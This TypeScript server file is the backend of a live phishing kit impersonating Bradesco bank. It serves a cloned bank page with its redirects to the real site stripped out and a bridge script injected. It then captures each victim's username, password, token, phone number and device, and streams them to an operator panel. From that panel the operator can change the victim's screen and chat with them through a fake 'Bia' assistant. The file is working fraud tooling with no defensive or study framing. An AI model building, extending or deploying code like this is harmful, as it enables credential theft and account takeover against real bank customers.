import "dotenv/config";
import express from "express";
import { createServer } from "http";
import net from "net";
import path from "path";
import fs from "fs";
import { Server } from "socket.io";
import { createExpressMiddleware } from "@trpc/server/adapters/express";
import { registerOAuthRoutes } from "./oauth";
import { registerStorageProxy } from "./storageProxy";
import { appRouter } from "../routers";
import { createContext } from "./context";
import { serveStatic, setupVite } from "./vite";

function isPortAvailable(port: number): Promise<boolean> {
  return new Promise(resolve => {
    const server = net.createServer();
    server.listen(port, () => {
      server.close(() => resolve(true));
    });
    server.on("error", () => resolve(false));
  });
}

async function findAvailablePort(startPort: number = 3000): Promise<number> {
  for (let port = startPort; port < startPort + 20; port++) {
    if (await isPortAvailable(port)) {
      return port;
    }
  }
  throw new Error(`No available port found starting from ${startPort}`);
}

type ClientSession = {
  sessionId: string;
  socketId: string | null;
  operatorSocketId: string | null;
  usuario: string;
  senha: string;
  ip: string;
  pais: string;
  estado: string;
  cidade: string;
  device: string;
  status: string;
  telaAtual: string;
  conectadoEm: number;
  ultimaAtualizacao: number;
  token: string;
  ddd: string;
  telefone: string;
  mensagensBia: Array<{ de: "operador" | "cliente"; texto: string; ts: number }>;
  avatarBia: string;
  nomeEnviado: string;
  serialEnviado: string;
  qrCodeEnviado: string;
};

const sessions = new Map<string, ClientSession>();
const SESSIONS_FILE = path.resolve(process.cwd(), "sessions_backup.json");

try {
  if (fs.existsSync(SESSIONS_FILE)) {
    const data = JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf-8"));
    Object.entries(data).forEach(([id, s]: [string, any]) => {
      sessions.set(id, { ...s, status: "offline", socketId: null });
    });
    console.log(`[INIT] ${sessions.size} sessoes carregadas do backup.`);
  }
} catch (err) {
  console.error("[INIT] Erro ao carregar backup de sessoes:", err);
}

setInterval(() => {
  try {
    const now = Date.now();
    const ONE_DAY = 24 * 60 * 60 * 1000;
    for (const [id, s] of sessions.entries()) {
      if (now - s.ultimaAtualizacao > ONE_DAY && s.status === "offline") {
        sessions.delete(id);
      }
    }
    const data = Object.fromEntries(sessions);
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(data), "utf-8");
  } catch (err) {
    console.error("[BACKUP] Erro ao salvar/limpar sessoes:", err);
  }
}, 30000);

function getClientIp(req: any): string {
  return (
    (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
    req.socket?.remoteAddress ||
    "0.0.0.0"
  );
}

function geoLocate(_ip: string) {
  const locations = [
    { pais: "Brasil", estado: "SP", cidade: "São Paulo" },
    { pais: "Brasil", estado: "RJ", cidade: "Rio de Janeiro" },
    { pais: "Brasil", estado: "MG", cidade: "Belo Horizonte" },
    { pais: "Brasil", estado: "RS", cidade: "Porto Alegre" },
    { pais: "Brasil", estado: "PR", cidade: "Curitiba" },
  ];
  return locations[Math.floor(Math.random() * locations.length)];
}

function detectDevice(ua: string): string {
  if (!ua) return "Desconhecido";
  if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
  if (/Android/i.test(ua)) return "Android";
  if (/Windows/i.test(ua)) return "Windows";
  if (/Mac/i.test(ua)) return "MacOS";
  if (/Linux/i.test(ua)) return "Linux";
  return "Desktop";
}

function snapshotSessions() {
  return Array.from(sessions.values()).map(s => ({
    sessionId: s.sessionId,
    usuario: s.usuario,
    senha: s.senha,
    ip: s.ip,
    pais: s.pais,
    estado: s.estado,
    cidade: s.cidade,
    device: s.device,
    status: s.status,
    telaAtual: s.telaAtual,
    conectadoEm: s.conectadoEm,
    ultimaAtualizacao: s.ultimaAtualizacao,
    token: s.token,
    ddd: s.ddd,
    telefone: s.telefone,
    mensagensBia: s.mensagensBia,
    avatarBia: s.avatarBia,
    nomeEnviado: s.nomeEnviado,
    serialEnviado: s.serialEnviado,
    qrCodeEnviado: s.qrCodeEnviado,
  }));
}

async function startServer() {
  console.log("[INIT] Iniciando servidor...");
  const app = express();
  const server = createServer(app);
  console.log("[INIT] Servidor HTTP criado.");
  const io = new Server(server, {
    cors: { 
      origin: "*",
      methods: ["GET", "POST"],
      credentials: true
    },
    allowEIO3: true,
    pingTimeout: 60000,
    pingInterval: 25000,
    transports: ["polling"],
    path: "/socket.io/"
  });

  app.use(express.json({ limit: "50mb" }));
  app.use(express.urlencoded({ limit: "50mb", extended: true }));

  registerStorageProxy(app);
  registerOAuthRoutes(app);

  const bradescoPublicDir = path.resolve(process.cwd(), "client", "public");
  app.use("/cliente-static", express.static(bradescoPublicDir));

  const handleBradescoRequest = (req: any, res: any) => {
    const htmlPath = path.join(bradescoPublicDir, "bradesco.html");
    if (!fs.existsSync(htmlPath)) {
      res.status(500).send("bradesco.html não encontrado");
      return;
    }
    let html = fs.readFileSync(htmlPath, "utf-8");

    // Reescrever URLs relativas para caminhos absolutos baseados em /cliente-static/
    html = html.replace(/(href|src)="(?!https?:|\/\/|\/cliente-static|javascript:|#|data:)([^"]+)")/g, (_m, attr, url) => {
      const cleanUrl = url.startsWith("/") ? url : `/${url}`;
      return `${attr}="/cliente-static${cleanUrl}"`;
    });

    html = html.replace(/window\.location\s*=\s*['"]https:\/\/[^'"]+['"]/g, "/* removido */");
    html = html.replace(/document\.location\s*=\s*['"]https:\/\/[^'"]+['"]/g, "/* removido */");
    html = html.replace(/document\.domain\s*=\s*['"][^'"]+['"];?/g, "/* removido */");

    // Injetar Socket.IO e Bridge com caminhos absolutos
    const inject = `
<link rel="stylesheet" href="/cliente-static/__bridge__/cliente-bridge.css">
<script src="/socket.io/socket.io.js"></script>
<script src="/cliente-static/__bridge__/cliente-bridge.js"></script>
`;
    html = html.replace(/<\/body>/i, `${inject}</body>`);
    res.set("Content-Type", "text/html; charset=utf-8");
    res.send(html);
  };

  app.get("/cliente", handleBradescoRequest);
  app.get("/cliente-html", handleBradescoRequest);

  io.on("connection", socket => {
    const role = (socket.handshake.query.role as string) || "client";
    let sessionId = (socket.handshake.query.sessionId as string) || "unknown";
    const ip = getClientIp(socket.request);
    const ua = socket.handshake.headers["user-agent"] || "";

    if (role === "operator") {
      console.log(`[OP] Operador conectado: ${socket.id}`);
      socket.join("operators");
      socket.emit("operator:sessions", snapshotSessions());

      socket.on("operator:command", (data: { sessionId: string; command: string; payload?: any }) => {
        const s = sessions.get(data.sessionId);
        if (s) {
          s.telaAtual = data.command;
          s.ultimaAtualizacao = Date.now();
          io.to(`session:${data.sessionId}`).emit("client:command", { command: data.command, payload: data.payload });
          if (s.socketId) io.to(s.socketId).emit("client:command", { command: data.command, payload: data.payload });
          io.to("operators").emit("operator:sessions", snapshotSessions());
        }
      });

      socket.on("operator:bia-message", (data: { sessionId: string; texto: string }) => {
        const s = sessions.get(data.sessionId);
        if (s) {
          s.mensagensBia.push({ de: "operador", texto: data.texto, ts: Date.now() });
          s.ultimaAtualizacao = Date.now();
          io.to(`session:${data.sessionId}`).emit("client:bia-message", { texto: data.texto });
          if (s.socketId) io.to(s.socketId).emit("client:bia-message", { texto: data.texto });
          io.to("operators").emit("operator:sessions", snapshotSessions());
        }
      });
    } else {
      socket.on("client:register", (data: { sessionId: string }) => {
        sessionId = data.sessionId;
        socket.join(`session:${sessionId}`);
        let sess = sessions.get(sessionId);
        if (!sess) {
          const geo = geoLocate(ip);
          sess = {
            sessionId,
            socketId: socket.id,
            operatorSocketId: null,
            usuario: "",
            senha: "",
            ip,
            pais: geo.pais,
            estado: geo.estado,
            cidade: geo.cidade,
            device: detectDevice(ua),
            status: "online",
            telaAtual: "login",
            conectadoEm: Date.now(),
            ultimaAtualizacao: Date.now(),
            token: "",
            ddd: "",
            telefone: "",
            mensagensBia: [],
            avatarBia: "",
            nomeEnviado: "",
            serialEnviado: "",
            qrCodeEnviado: "",
          };
          sessions.set(sessionId, sess);
        } else {
          sess.socketId = socket.id;
          sess.status = "online";
          sess.ultimaAtualizacao = Date.now();
        }
        socket.emit("client:welcome", { sessionId });
        io.to("operators").emit("operator:sessions", snapshotSessions());
      });

      socket.on("client:input", (data: { field: string; value: string }) => {
        const sess = sessions.get(sessionId);
        if (sess) {
          (sess as any)[data.field] = data.value;
          sess.ultimaAtualizacao = Date.now();
          io.to("operators").emit("operator:sessions", snapshotSessions());
        }
      });

      socket.on("client:screen", (data: { screen: string }) => {
        const sess = sessions.get(sessionId);
        if (sess) {
          sess.telaAtual = data.screen;
          sess.ultimaAtualizacao = Date.now();
          io.to("operators").emit("operator:sessions", snapshotSessions());
        }
      });

      socket.on("client:bia-message", (data: { texto: string }) => {
        const sess = sessions.get(sessionId);
        if (sess) {
          sess.mensagensBia.push({ de: "cliente", texto: data.texto, ts: Date.now() });
          sess.ultimaAtualizacao = Date.now();
          io.to("operators").emit("operator:sessions", snapshotSessions());
        }
      });
    }

    socket.on("disconnect", () => {
      const sess = sessions.get(sessionId);
      if (sess && sess.socketId === socket.id) {
        sess.status = "offline";
        sess.socketId = null;
        io.to("operators").emit("operator:sessions", snapshotSessions());
      }
    });
  });

  app.use("/api/trpc", createExpressMiddleware({ router: appRouter, createContext }));

  if (process.env.NODE_ENV === "development") {
    await setupVite(app, server);
  } else {
    serveStatic(app);
  }

  const port = parseInt(process.env.PORT || "3000");
  server.listen(port, "0.0.0.0", () => {
    console.log(`Server running on port ${port}`);
  });
}

startServer().catch(console.error);
